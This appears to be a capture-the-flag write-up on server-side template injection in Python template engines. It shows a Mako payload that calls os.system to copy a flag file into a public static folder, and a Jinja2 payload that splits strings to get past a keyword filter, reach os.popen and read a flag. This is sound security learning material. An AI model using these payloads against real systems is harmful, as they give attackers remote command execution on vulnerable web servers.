on using a payload from payloadallthings for mako (A python template engine)
```
${self.module.cache.util.os.system("id")}
```
It only shows `0`, which is the error code that `os.system` returns. Using `os.system` we will not be able to read the flag directly, but we have code execution, so we can copy the `/flag.txt` into a public directory:

```
${self.module.cache.util.os.system("cp /flag.txt /app/application/static/css")}  
```
further access the flag by using `$ curl 161.35.174.99:30548/static/css/flag.txt`

### Lab (pentathon '25)

Capturing the request and sending it, we can see that the `name` field is reflected back to us. Before trying `sqli` we input characters like `<>` to see if we can do `xss` payload. We also try `{{}}` to check for `ssti` (template injection).
Sending `{{7*7}}` we get back `49`. So the site is vulnerable to `SSTI`.

> After the server blocking some request and either giving us error or not allowed we get some progress using `{{request}}`.

Payload used for SSTI 
```
name={% set b = request.application[['__glo','bals__'] | join][['__buil','tins__'] | join] %}
{% set i = b[['__impo','rt__'] | join] %}
{% set o = i(['o','s'] | join) %}
{% set p = o[['po','pen'] | join] %}
{% set cmd = ['c','a','t',' ','fl','ag','.txt'] | join %}
{{p(cmd).read()}}
&email=test%40mail.com&message=Test
```




### References
https://app.hackthebox.com/challenges/Spookifier - Py SSTI 

Jinja2 - [Server Side Template Injection with Jinja2 for you now](https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/)